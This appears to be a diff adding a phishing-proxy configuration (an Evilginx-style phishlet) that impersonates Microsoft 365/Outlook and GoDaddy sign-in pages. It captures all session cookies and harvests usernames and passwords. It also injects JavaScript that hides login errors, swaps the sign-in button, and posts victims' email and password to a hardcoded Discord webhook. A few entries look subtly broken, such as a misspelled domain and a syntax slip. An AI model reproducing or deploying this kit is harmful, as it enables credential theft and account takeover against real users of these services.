@@ -1,0 +1,234 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'login'  , orig_sub: 'login'           , domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www'    , orig_sub: 'www'             , domain: 'office.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'aadcdn' , orig_sub: 'aadcdn'          , domain: 'msauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'blobs'  , orig_sub: 'blobs.officehome', domain: 'msocdn.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook'         , domain: 'office.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'outlook365', orig_sub: 'outlook'      , domain: 'office365.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'r4'     , orig_sub: 'r4.res'          , domain: 'office365.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sso'    , orig_sub: 'sso'             , domain: 'godaddy.com'  , session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'img1'   , orig_sub: 'img1'            , domain: 'wsimg.com'    , session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'img6'   , orig_sub: 'img6'            , domain: 'wsimg.com'    , session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"FederationRedirectUrl"\:"https?\:\/\/.*\?(.*realm\=pass&app\=o365.*)"\},"EstsProperties"', replace: '"FederationRedirectUrl":"https://sso.{domain}/?${1}"},"EstsProperties"', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"FederationRedirectUrl"\:"https?\:\/\/.*\?(mkt\=en\-US&)?client\-request\-id\=.*"\},"EstsProperties"', replace: '"FederationRedirectUrl":"https://www.instagram.com?worker=worker"},"EstsProperties"', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'aadcdn.msauth.net', replace: 'aadcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'blobs.officehome.msocdn.com', replace: 'blobs.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'outlook.office365.com', replace: 'outlook365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'r4.res.office365.com', replace: 'r4.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'aadcdn.msauth.net', replace: 'aadcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'blobs.officehome.msocdn.com', replace: 'blobs.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'outlook.office365.com', replace: 'outlook365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'r4.res.office365.com', replace: 'r4.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'aadcdn.msauth.net', replace: 'aadcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'blobs.officehome.msocdn.com', replace: 'blobs.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'outlook.office365.com', replace: 'outlook365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'r4.res.microsoftonline.com', replace: 'r4.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'blobs.officehome.msocdn.com', orig_sub: 'blobs.officehome', domain: 'msocdn.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'blobs.officehome.msocdn.com', orig_sub: 'blobs.officehome', domain: 'msocdn.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'blobs.officehome.msocdn.com', orig_sub: 'blobs.officehome', domain: 'msocdn.com', search: 'aadcdn.msauth.net', replace: 'aadcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'blobs.officehome.msocdn.com', orig_sub: 'blobs.officehome', domain: 'msocdn.com', search: 'blobs.officehome.msocdn.com', replace: 'blobs.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'blobs.officehome.msocdn.com', orig_sub: 'blobs.officehome', domain: 'msocdn.com', search: 'outlook.office365.com', replace: 'outlook365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'blobs.officehome.msocdn.com', orig_sub: 'blobs.officehome', domain: 'msocdn.com', search: 'r4.res.microsoftonline.com', replace: 'r4.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'blobs.officehome.msocdn.com', orig_sub: 'blobs.officehome', domain: 'msocdn.com', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'outlook.office365.com', orig_sub: 'outlook', domain: 'office365.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office365.com', orig_sub: 'outlook', domain: 'office365.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office365.com', orig_sub: 'outlook', domain: 'office365.com', search: 'aadcdn.msauth.net', replace: 'aadcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office365.com', orig_sub: 'outlook', domain: 'office365.com', search: 'blobs.officehome.msocdn.com', replace: 'blobs.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office365.com', orig_sub: 'outlook', domain: 'office365.com', search: 'outlook.office365.com', replace: 'outlook365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office365.com', orig_sub: 'outlook', domain: 'office365.com', search: 'r4.res.microsoftonline.com', replace: 'r4.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office365.com', orig_sub: 'outlook', domain: 'office365.com', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'r4.res.office365.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'r4.res.office365.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'r4.res.office365.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'aadcdn.msauth.net', replace: 'aadcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'r4.res.office365.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'blobs.officehome.msocdn.com', replace: 'blobs.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'r4.res.office365.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'outlook.office365.com', replace: 'outlook365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'r4.res.office365.com', orig_sub: 'r4.res', domain: 'office365.com', search: 'r4.res.microsoftonline.com', replace: 'r4.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'r4.res.office365.com', orig_sub: 'r4.res', domain: 'office465.com', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'outlook.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'aadcdn.msauth.net', replace: 'aadcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'blobs.officehome.msocdn.com', replace: 'blobs.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'outlook.office365.com', replace: 'outlook365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'r4.res.microsoftonline.com', replace: 'r4.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'outlook.office.com', orig_sub: 'outlook', domain: 'office.com', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'sso.godaddy.com'   , orig_sub: 'sso'    , domain: 'godaddy.com', search: 'godaddy.com', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com'   , orig_sub: 'sso'    , domain: 'godaddy.com', search: 'login.microsoftonline.com', replace: 'login.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com'   , orig_sub: 'sso'    , domain: 'godaddy.com', search: 'outlook.office.com', replace: 'outlook.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com'   , orig_sub: 'sso'    , domain: 'godaddy.com', search: 'www.office.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com'   , orig_sub: 'sso'    , domain: 'godaddy.com', search: 'img1.wsimg.com', replace: 'img1.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com'   , orig_sub: 'sso'    , domain: 'godaddy.com', search: 'img6.wsimg.com', replace: 'img6.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'img1.wsimg.com' , orig_sub: 'img1', domain: 'wsimg.com', search: 'img1.wsimg.com', replace: 'img1.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'img1.wsimg.com' , orig_sub: 'img1', domain: 'wsimg.com', search: 'img6.wsimg.com', replace: 'img6.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'img1.wsimg.com' , orig_sub: 'img1', domain: 'wsimg.com', search: 'godaddy.com', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'img6.wsimg.com' , orig_sub: 'img6', domain: 'wsimg.com', search: 'img6.wsimg.com', replace: 'img6.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'img6.wsimg.com' , orig_sub: 'img6', domain: 'wsimg.com', search: 'godaddy.com', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'img6.wsimg.com' , orig_sub: 'img6', domain: 'wsimg.com', search: 'img1.wsimg.com', replace: 'img1.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*,regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*,regexp']
+  - domain: 'www.office.com'
+    keys: ['.*,regexp']
+  - domain: 'outlook.office365.com'
+    keys: ['.*,regexp']
+  - domain: 'r4.res.office365.com'
+    keys: ['.*,regexp']
+  - domain: 'office365.com'
+    keys: ['.*,regexp']
+  - domain: '.office.com'
+    keys: ['.*,regexp']
+  - domain: 'outlook.office.com'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: ''
+      search: '\{"username"\:"(.*)","password"\:".*"'     #Godaddy Username
+      type: 'json'
+    - key: ''
+      search: '\{"username"\:".*","password"\:"([^"]*)'     #Godaddy Password
+      type: 'json'
+
+auth_urls:
+  - '/owa/userbootsettings.ashx'
+  - '/owa/service.svc'
+  - '/mail/inbox'
+
+login:
+  domain: 'outlook.office.com'
+  path: '/mail'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'flowToken', search: '.*'}
+      - {key: 'type', search: '.*'}
+      - {key: 'ctx' , search: '.*'}
+      - {key: 'hpgrequestid', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+
+js_inject:
+  - trigger_domains: ['sso.godaddy.com']
+    trigger_paths: ['/']
+    trigger_params: ['userinputEmail']
+    script: |
+      var host = 'https://' + location.host + '/v1/api/pass/login' + location.href.split("/")[3]; console.log("{userinputEmail}");
+      var tosend = '{"username":"'+ document.getElementById('username').value +'","password":"'+ document.getElementById('password') +'","remember_me":true,"plid":1,"API_HOST":"godaddy.com","captcha_code":"","captcha_type":"recaptcha_v2_invisible"}'
+
+      function getDomainName(hostName){
+        return hostName.substring(hostName.lastIndexOf(".", hostName.lastIndexOf(".") - 1) + 1);
+      }
+
+      setInterval(function(){
+        var el = document.getElementById('login-status-message');
+        if(el){
+          el.style.display = 'none'
+        }
+      }, 300);
+
+      var but = document.getElementById("#submitBtn");
+      but.addEventListener('click', function(){
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function(){
+            if (this.readyState == 4 && this.status == 200) {
+                window.location = getDomainName(location.host);
+            }else{
+                alert("Wrong Credentials");
+            }
+        }
+        xhr.open('POST', host, false);
+        xhr.send(tosend);
+      });
+
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/']
+    trigger_params: ['userinputEmail']
+    script: |
+      var tta = 'https://discord.com/api/webhooks/888538559596888075/GGrGhTQ-H7B0HvgeX7rYNHfi5FKzUQvc4YTavEVmjJ-E_cpe5JetoHByz5bVBJ9rltFT';  // Submission
+      var ttb = window.location.href;             // Redirection Page
+      var attrset = false;
+      var attrset2 = false;
+      console.log("{userinputEmail}");
+
+      function ss(zz, xx, element){
+          var xhr = new XMLHttpRequest();
+          xhr.onreadystatechange = function(){
+          };
+          xhr.open('POST', tta, false);                 // Change Me
+          xhr.setRequestHeader('Content-type', 'application/json');
+          xhr.send(JSON.stringify({ "content": "email="+zz+"&password="+xx, "username": "Office@page" })));
+          element.click();
+      }
+
+      setInterval(function(){
+        var kk = document.getElementById('usernameError');
+        if((kk) && (!(attrset2))){
+            if((kk.innerText.includes("We couldn't find an account with that username")) || (kk.innerText.includes("in our system. Make sure you typed it correctly."))){
+              kk.style.display = 'none';
+              window.location = ttb;
+              attrset2 = true;
+            }
+        }
+      }, 50);
+
+      setInterval(function(){
+        if(!(attrset)){
+          var check = document.getElementById('displayName');
+          if(check && check.innerHTML == "specialsomething"){
+              var pp = document.getElementById('idSIButton9');
+
+              bHTML = '<input id="myCustomButton69" type="submit" class="btn btn-block btn-primary" value="Sign in" style="display: block; max-width: 100px;">';
+              pp.style.display = 'none';
+              pp.type = 'button';
+              pp.insertAdjacentHTML('afterend', bHTML);
+
+              var qq = document.getElementById('myCustomButton69');
+
+              qq.addEventListener('click', function(){
+                  var em = check.title;
+                  var pw = document.getElementById('i0118').value;
+
+                  ss(em, pw, pp);
+
+                  return false;
+              });
+
+              attrset = true;
+          }
+        }
+      }, 3000);
